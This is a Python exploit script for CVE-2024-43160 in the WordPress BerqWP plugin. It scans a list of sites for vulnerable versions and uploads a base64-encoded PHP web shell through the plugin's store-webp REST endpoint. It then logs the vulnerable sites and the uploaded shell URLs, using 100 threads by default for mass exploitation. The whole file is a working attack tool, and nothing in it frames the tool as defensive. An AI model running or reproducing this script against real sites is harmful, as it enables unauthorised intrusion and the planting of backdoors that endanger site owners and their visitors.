#!/usr/bin/env python3
# -*- coding: utf-8 -*
from re import findall
from base64 import b64encode
from argparse import ArgumentParser
from random import getrandbits
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from requests import Session
__import__('warnings').simplefilter('ignore',Warning)

#i dont do typing in simple python scripts cs am no diddy so dont be diddy use typin only on "big" code (no diddy :D)

class CVE_2024_43160:

    def Save(self, file, data):
        with self.Lock:
            with open(file, 'a') as f:
                f.write(f"{data}\n")

    def Exploit(self, url):
        name   = f"{getrandbits(32)}.php"
        params = {
            "image":self.shell,
            "url":name,
            "license_key_hash":"d41d8cd98f00b204e9800998ecf8427e"
        }
        self.session.post(f"{url}wp-json/optifer/v1/store-webp", data=params)
        r = self.session.get(f"{url}{name}").text
        if "kill_the_net" in r:
            print(f" [ LOG ] (SHELL UPLOADED) {url}")
            return self.Save("__shells__.txt", f"{url}{name}")
        print(f" [ LOG ] (SHELL NOT UPLOADED) {url}")

    def Scan(self, url):
        url = f"{'http://' if not url.lower().startswith(('http://', 'https://')) else ''}{url}{'/' if not url.endswith('/') else ''}"
        print(f" [ LOG ] (CHECKING) {url}")
        try:
            r = self.session.get(f"{url}wp-content/plugins/searchpro/readme.txt").text
            if 'BerqWP' in r and "= 1.7.7 =" not in r:
                print(f" [ LOG ] (VULN) {url}")
                self.Save("__vuln__.txt", url)
                return self.Exploit(url)
            print(f" [ LOG ] (NOT VULN) {url}")
        except:
            print(f" [LOG] EXCEPTION ERROR ({url})")

    def __init__(self, Lock):
        self.Lock  = Lock
        self.shell = b64encode('''<?php error_reporting(0);echo("kill_the_net<form method='POST' enctype='multipart/form-data'><input type='file'name='f' /><input type='submit' value='up' /></form>");@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");?>'''.encode()).decode()
        self.session = Session()
        self.session.verify  = False
        self.session.timeout = (20,40)
        self.session.allow_redirects = True
        self.session.max_redirects = 5
        self.session.headers.update({"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"})

if __name__ == '__main__':
    print('''


    db   d8b   db d8888b.      d88888b db    db d8888b. 
    88   I8I   88 88  `8D      88'     `8b  d8' 88  `8D 
    88   I8I   88 88oodD'      88ooooo  `8bd8'  88oodD' 
    Y8   I8I   88 88~~~        88~~~~~  .dPYb.  88~~~   
    `8b d8'8b d8' 88           88.     .8P  Y8. 88      
     `8b8' `8d8'  88           Y88888P YP    YP 88      
                                                TG: @KtN_1990

        ''')

    parser = ArgumentParser()
    parser.add_argument('-l', '--list', help="Path of list site", required=True)
    parser.add_argument('-t', '--threads', type=int, help="threads number", default=100)
    args = parser.parse_args()
    try:
        with open(args.list, 'r') as f: urls = list(set(f.read().splitlines()))
        ExpObj = CVE_2024_43160(Lock())
        with ThreadPoolExecutor(max_workers=int(args.threads)) as pool:
            [pool.submit(ExpObj.Scan, url) for url in urls]
    except Exception as e:
        print(e)
        print(" [LOG] EXCEPTION ERROR @ MAIN FUNC")
